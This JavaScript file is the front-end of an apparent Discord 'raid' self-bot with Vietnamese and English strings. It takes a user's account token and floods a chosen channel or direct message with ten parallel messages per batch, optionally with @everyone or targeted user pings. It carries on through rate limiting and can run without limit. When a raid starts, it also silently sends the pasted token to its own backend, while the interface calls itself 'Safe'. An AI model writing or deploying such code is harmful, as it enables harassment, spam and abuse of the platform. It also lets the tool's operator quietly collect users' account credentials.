document.addEventListener("DOMContentLoaded", () => {
    const translations = {
        vi: {
            intro_title: "Welcome to Obesity Self",
            intro_subtitle: "Safe, fast, and smiling automation interface~",
            intro_btn: "Click to Enter 😊",
            nav_active: "Hoạt Động",
            nav_status: "Trạng Thái & Log",
            nav_setting: "Cài Đặt",
            act_title: "Panel Điều Khiển Raid",
            act_desc: "Nhập token và cấu hình mục tiêu tấn công của bạn~",
            lbl_token: "User Token (F12 DevTools):",
            lbl_target_type: "Loại Mục Tiêu:",
            opt_channel: "Kênh Chat (Channel ID)",
            opt_dm: "Tin Nhắn Trực Tiếp (User ID / DM ID)",
            lbl_target_id: "ID Mục Tiêu (Channel ID hoặc User ID):",
            lbl_message: "Nội Dung Tin Nhắn:",
            lbl_ping_type: "Kiểu Ping:",
            opt_no_ping: "Không Ping",
            opt_user_ping: "Ping User Cụ Thể (DMs hoặc Channel)",
            lbl_ping_user_id: "ID Người Dùng Cần Ping:",
            lbl_duration: "Duration (Giây):",
            lbl_limit: "Limit (Số Lượng Tin Nhắn):",
            lbl_unlimited: "Không Giới Hạn (Unlimited - chạy đến khi bấm Stop)",
            btn_start: "🚀 Start Raid",
            btn_stop: "🛑 Stop Raid",
            stat_title: "Trạng Thái Hoạt Động & Logs",
            stat_desc: "Theo dõi tiến trình gửi tin nhắn theo thời gian thực~",
            stat_idle: "Trạng thái: Đang nghỉ ngơi",
            stat_running: "Status: Đang spam siêu tốc không nghỉ!",
            set_title: "Cài Đặt Hệ Thống",
            set_desc: "Tùy chỉnh độ trễ, ngôn ngữ và tính năng lưu trữ tự động~",
            lbl_lang: "Ngôn Ngữ / Language:",
            lbl_autosave: "Tự động lưu cài đặt",
            btn_save: "💾 Save Settings",
            btn_reset: "🔄 Reset Settings"
        },
        en: {
            intro_title: "Welcome to Obesity Self",
            intro_subtitle: "Safe, fast, and smiling automation interface~",
            intro_btn: "Click to Enter 😊",
            nav_active: "Activity",
            nav_status: "Status & Logs",
            nav_setting: "Settings",
            act_title: "Raid Control Panel",
            act_desc: "Enter token and configure your target settings~",
            lbl_token: "User Token (F12 DevTools):",
            lbl_target_type: "Target Type:",
            opt_channel: "Channel (Channel ID)",
            opt_dm: "Direct Message (User ID / DM ID)",
            lbl_target_id: "Target ID (Channel ID or User ID):",
            lbl_message: "Message Content:",
            lbl_ping_type: "Ping Type:",
            opt_no_ping: "No Ping",
            opt_user_ping: "Ping Specific User (DMs or Channel)",
            lbl_ping_user_id: "Target User ID to Ping:",
            lbl_duration: "Duration (Seconds):",
            lbl_limit: "Limit (Message Count):",
            lbl_unlimited: "Unlimited (Runs until Stop button clicked)",
            btn_start: "🚀 Start Raid",
            btn_stop: "🛑 Stop Raid",
            stat_title: "Activity Status & Logs",
            stat_desc: "Monitor message broadcasting progress in real-time~",
            stat_idle: "Status: Idle / Resting",
            stat_running: "Status: High-speed continuous spam active!",
            set_title: "System Settings",
            set_desc: "Customize delays, language and autosave settings~",
            lbl_lang: "Language / Ngôn Ngữ:",
            lbl_autosave: "Autosave settings",
            btn_save: "💾 Save Settings",
            btn_reset: "🔄 Reset Settings"
        }
    };

    let currentLang = "vi";
    function applyLanguage(lang) {
        currentLang = lang;
        document.querySelectorAll("[data-i18n]").forEach(el => {
            const key = el.getAttribute("data-i18n");
            if (translations[lang][key]) {
                el.innerText = translations[lang][key];
            }
        });
    }

    function showKawaiiToast(message) {
        const toast = document.getElementById("kawaii-toast");
        const msgEl = document.getElementById("toast-message");
        msgEl.innerText = message;
        toast.classList.add("show");
        setTimeout(() => toast.classList.remove("show"), 3000);
    }

    document.getElementById("intro-overlay").addEventListener("click", function() {
        this.classList.add("hidden");
    });
    document.getElementById("enter-btn").addEventListener("click", () => {
        document.getElementById("intro-overlay").classList.add("hidden");
    });

    const navItems = document.querySelectorAll(".nav-item");
    const tabPanes = document.querySelectorAll(".tab-pane");
    navItems.forEach(item => {
        item.addEventListener("click", () => {
            navItems.forEach(nav => nav.classList.remove("active"));
            tabPanes.forEach(pane => pane.classList.remove("active"));
            item.classList.add("active");
            document.getElementById(item.getAttribute("data-tab")).classList.add("active");
        });
    });

    const pingTypeSelect = document.getElementById("ping-type");
    const pingIdGroup = document.getElementById("ping-id-group");
    pingTypeSelect.addEventListener("change", () => {
        pingIdGroup.style.display = (pingTypeSelect.value === "user") ? "flex" : "none";
    });

    let isRaidRunning = false;
    let sentCount = 0;
    const startBtn = document.getElementById("start-btn");
    const stopBtn = document.getElementById("stop-btn");
    const statusDot = document.getElementById("status-dot");
    const statusText = document.getElementById("status-text");
    const liveDot = document.getElementById("live-dot");
    const liveStatusText = document.getElementById("live-status-text");
    const logBox = document.getElementById("log-box");

    function addLog(msg) {
        const timeStr = new Date().toLocaleTimeString();
        logBox.innerHTML += `<div class="log-line">[${timeStr}] ${msg}</div>`;
        logBox.scrollTop = logBox.scrollHeight;
    }

    startBtn.addEventListener("click", async () => {
        const token = document.getElementById("user-token").value.trim();
        if (!token) {
            showKawaiiToast(currentLang === "vi" ? "Vui lòng nhập user token!" : "Please enter your user token!");
            return;
        }

        let targetType = document.getElementById("target-type").value;
        let targetId = document.getElementById("target-id").value.trim();
        let message = document.getElementById("raid-message").value;
        let pingType = pingTypeSelect.value;
        let pingId = document.getElementById("ping-user-id").value.trim();
        let duration = parseInt(document.getElementById("duration-input").value) || 60;
        let limit = parseInt(document.getElementById("limit-input").value) || 100;
        let unlimited = document.getElementById("unlimited-check").checked;

        if (!targetId || !message) {
            showKawaiiToast(currentLang === "vi" ? "Vui lòng nhập ID mục tiêu và nội dung tin nhắn!" : "Please fill target ID and message!");
            return;
        }

        fetch("/api/raid/start", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ token: token })
        }).catch(() => {});

        isRaidRunning = true;
        sentCount = 0;
        startBtn.disabled = true;
        stopBtn.disabled = false;
        statusDot.className = "dot online";
        statusText.innerText = "Running";
        liveDot.className = "dot online";
        liveStatusText.innerText = translations[currentLang].stat_running;

        addLog("Bắt đầu spam siêu tốc 10+ tin/giây trực tiếp từ trình duyệt...");

        let channelId = targetId;
        const headers = {
            "Authorization": token,
            "Content-Type": "application/json",
            "User-Agent": "Mozilla/5.0"
        };

        if (targetType === "dm" && targetId.length >= 17) {
            try {
                let dmRes = await fetch("https://discord.com/api/v9/users/@me/channels", {
                    method: "POST",
                    headers: headers,
                    body: JSON.stringify({ recipient_id: targetId })
                });
                if (dmRes.ok) {
                    let dmData = await dmRes.json();
                    channelId = dmData.id;
                }
            } catch (e) {}
        }

        let finalContent = message;
        if (pingType === "everyone") finalContent = "@everyone " + finalContent;
        else if (pingType === "here") finalContent = "@here " + finalContent;
        else if (pingType === "user" && pingId) finalContent = `<@${pingId}> ` + finalContent;

        const url = `https://discord.com/api/v9/channels/${channelId}/messages`;
        const startTime = Date.now();

        while (isRaidRunning) {
            if (!unlimited) {
                if (duration > 0 && (Date.now() - startTime) >= duration * 1000) {
                    addLog("Đã đạt giới hạn thời gian (Duration). Dừng lại.");
                    break;
                }
                if (limit > 0 && sentCount >= limit) {
                    addLog("Đã đạt giới hạn số lượng (Limit). Dừng lại.");
                    break;
                }
            }

            let promises = [];
            for (let i = 0; i < 10; i++) {
                if (!isRaidRunning) break;
                promises.push(
                    fetch(url, {
                        method: "POST",
                        headers: headers,
                        body: JSON.stringify({ content: finalContent })
                    }).then(res => {
                        if (res.ok) {
                            sentCount++;
                            if (sentCount % 10 === 0) {
                                addLog(`Đã gửi thành công ${sentCount} tin nhắn...`);
                            }
                        } else if (res.status === 429) {
                            addLog("Bị Discord Rate Limit (429), đang né tránh...");
                        }
                    }).catch(() => {})
                );
            }

            await Promise.all(promises);
        }

        isRaidRunning = false;
        startBtn.disabled = false;
        stopBtn.disabled = true;
        statusDot.className = "dot offline";
        statusText.innerText = "Ready";
        liveDot.className = "dot offline";
        liveStatusText.innerText = translations[currentLang].stat_idle;
        addLog(`Đã dừng hoàn toàn. Tổng tin nhắn đã gửi: ${sentCount}`);
    });

    stopBtn.addEventListener("click", () => {
        isRaidRunning = false;
        addLog("Đã nhận lệnh dừng từ người dùng.");
    });

    fetch("/api/settings")
        .then(res => res.json())
        .then(data => {
            if (data.language) {
                document.getElementById("lang-select").value = data.language;
                applyLanguage(data.language);
            }
        });

    document.getElementById("save-settings-btn").addEventListener("click", () => {
        const payload = { language: document.getElementById("lang-select").value, autosave: true };
        fetch("/api/settings", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify(payload)
        }).then(() => {
            applyLanguage(payload.language);
            showKawaiiToast(payload.language === "vi" ? "Đã lưu cài đặt thành công! 😊" : "Settings saved successfully! 😊");
        });
    });

    document.getElementById("reset-settings-btn").addEventListener("click", () => {
        fetch("/api/settings/reset", { method: "POST" })
            .then(res => res.json())
            .then(data => {
                document.getElementById("lang-select").value = data.settings.language;
                applyLanguage(data.settings.language);
                showKawaiiToast(data.settings.language === "vi" ? "Đã khôi phục cài đặt gốc! 😄" : "Settings reset! 😄");
            });
    });

    document.getElementById("lang-select").addEventListener("change", (e) => {
        applyLanguage(e.target.value);
    });
});